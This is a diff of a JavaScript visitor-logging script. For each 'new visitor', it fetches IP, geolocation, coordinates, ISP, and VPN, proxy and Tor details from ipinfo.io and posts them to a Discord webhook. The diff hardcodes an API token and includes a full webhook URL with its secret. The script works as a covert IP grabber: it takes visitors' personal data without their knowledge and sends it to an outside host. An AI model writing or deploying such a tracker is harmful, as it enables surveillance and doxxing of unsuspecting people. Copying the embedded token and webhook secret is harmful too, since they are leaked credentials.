@@ -1,60 +1,47 @@
-// Ensure config.js is properly loaded
-if (typeof IPINFO_TOKEN === "undefined") {
-    console.error("IPINFO_TOKEN is not defined. Check config.js.");
-}
+const IPINFO_TOKEN = "7223e65562f40f";  // Replace with a new token when it expires
 
-// Function to fetch IP data
+// Function to fetch IP details
 async function fetchIPDetails() {
     try {
         const response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
         const data = await response.json();
 
-        // If API returns an error (e.g., missing token)
+        // If API returns an error (e.g., missing/expired token)
         if (data.error) {
             console.error("Error fetching IP details:", data.error.message);
-            return {
-                ip: "NA",
-                hostname: "NA",
-                city: "NA",
-                region: "NA",
-                country: "NA",
-                loc: "NA",
-                org: "NA",
-                postal: "NA",
-                timezone: "NA",
-                asn: { name: "NA", domain: "NA" },
-                company: { name: "NA" },
-                privacy: { vpn: false, proxy: false, tor: false, hosting: false },
-                abuse: { contact: "NA", email: "NA" },
-                domains: { total: "NA", domains: [] }
-            };
+            return setDefaultData();
         }
 
         return data;
     } catch (error) {
         console.error("Failed to fetch IP details:", error);
-        return {
-            ip: "NA",
-            hostname: "NA",
-            city: "NA",
-            region: "NA",
-            country: "NA",
-            loc: "NA",
-            org: "NA",
-            postal: "NA",
-            timezone: "NA",
-            asn: { name: "NA", domain: "NA" },
-            company: { name: "NA" },
-            privacy: { vpn: false, proxy: false, tor: false, hosting: false },
-            abuse: { contact: "NA", email: "NA" },
-            domains: { total: "NA", domains: [] }
-        };
+        return setDefaultData();
     }
+}
+
+// Function to return default "NA" data if API fails
+function setDefaultData() {
+    return {
+        ip: "NA",
+        hostname: "NA",
+        city: "NA",
+        region: "NA",
+        country: "NA",
+        loc: "NA",
+        org: "NA",
+        postal: "NA",
+        timezone: "NA",
+        asn: { name: "NA", domain: "NA" },
+        company: { name: "NA" },
+        privacy: { vpn: false, proxy: false, tor: false, hosting: false },
+        abuse: { contact: "NA", email: "NA" },
+        domains: { total: "NA", domains: [] }
+    };
 }
 
 // Function to send data to Discord webhook
 async function sendToDiscord(ipData) {
-    const webhookURL = "https://discord.com/api/webhooks/1334035398661374014/5VqXRcvWREzsTZKB02ssHEA7DMHJSAO5KWSJ4OWbOzBk8syNYXZYnvlzml9dOsTY6YKc";  // Replace with your actual Discord webhook
+    const webhookURL = "https://discord.com/api/webhooks/1334035398661374014/5VqXRcvWREzsTZKB02ssHEA7DMHJSAO5KWSJ4OWbOzBk8syNYXZYnvlzml9dOsTY6YKc";  // Replace with your Discord webhook
 
     const embed = {
         title: "🔍 New Visitor Logged",
@@ -65,7 +52,7 @@ async function sendToDiscord(ipData) {
             { name: "📍 Location", value: `${ipData.city || "NA"}, ${ipData.region || "NA"}, ${ipData.country || "NA"}`, inline: false },
             { name: "🌎 Coordinates", value: ipData.loc || "NA", inline: true },
             { name: "⏰ Timezone", value: ipData.timezone || "NA", inline: true },
-            { name: "🏢 ASN", value: `${ipData.asn.name || "NA"} (${ipData.asn.domain || "NA"})`, inline: false },
+            { name: "🏢 ASN", value: `${ipData.asn?.name || "NA"} (${ipData.asn?.domain || "NA"})`, inline: false },
             { name: "🏬 Company", value: ipData.company?.name || "NA", inline: false },
             { name: "🔐 VPN", value: ipData.privacy?.vpn ? "Yes" : "No", inline: true },
             { name: "🌍 Proxy", value: ipData.privacy?.proxy ? "Yes" : "No", inline: true },
